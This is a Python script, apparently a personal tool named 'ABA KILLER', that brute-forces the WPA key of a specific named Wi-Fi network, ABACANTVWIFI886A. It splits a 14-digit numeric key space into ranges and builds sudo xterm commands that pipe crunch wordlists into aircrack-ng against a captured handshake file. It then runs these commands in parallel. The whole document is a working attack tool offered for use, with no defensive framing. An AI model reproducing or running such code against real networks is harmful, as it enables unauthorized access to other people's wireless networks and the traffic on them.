import os  
from multiprocessing.dummy import Pool 

rangos = []

key_minima = 85047000000000
#las clave minima 
suma_key = 999999999 // 5

for i in range(5):
	key_minima += suma_key
	rangos.append(key_minima)


for i in range(5):
	rangos[i] = str(rangos[i])

print(rangos)


def banner():

	banner = """

	    ▄▄▄       ▄▄▄▄    ▄▄▄                  
	   ▒████▄    ▓█████▄ ▒████▄                
	   ▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄              
	   ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██             
	    ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒            
	    ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░            
	     ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░            
	     ░   ▒    ░    ░   ░   ▒               
	         ░  ░ ░            ░  ░            
	                   ░                       
	 ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███  
	 ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
	▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
	▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
	▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒
	▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
	░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
	░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ 
	░  ░    ░      ░  ░    ░  ░   ░  ░   ░     

	Ataque de fuerzabruta con paralelismo
	script by : TR4NS1STHOR
	"""               
	return banner                         



def ataque():
	ataques = []

	for i in range(len(rangos)) :
		
		if i == 0:
			kmin = str(key_minima)
			_ = int(rangos[i]) + 10
			rangos[i]= _
			comando_ataque = "sudo xterm -hold -e 'crunch 14 14 1234567890 -s 85047100000000  -e {rangos} | aircrack-ng camacho1-11.cap -e ABACANTVWIFI886A -w-'".format(kmin=kmin , rangos=rangos[i])
			ataques.append(comando_ataque)
			print("enter")
		if i == len(rangos):
			break
		if i < len(rangos) and i != (len(rangos) -1):

			comando_ataque = "sudo xterm -hold -e 'crunch 14 14 1234567890 -s {kmin} -e {rangos}| aircrack-ng camacho1-11.cap -e ABACANTVWIFI886A -w-'".format(kmin=rangos[i] , rangos=rangos[i+1])
			ataques.append(comando_ataque)
		

	return(ataques)



def inicio() : 
	i=0
	while i == 0 :
		os.system('clear')
		print(banner())
		i=str(input('iniciar el ataque? y/n : '))
		if i == 'n' or i != 'y':
			break

		pool = Pool(10)
		wifis_crackc = ataque()
		it = 0
		for i in wifis_crackc:
			it += 1
			print("ataque",it,i)
		pool.map(os.system,wifis_crackc)
		pool.join()
		#print(results)


inicio()
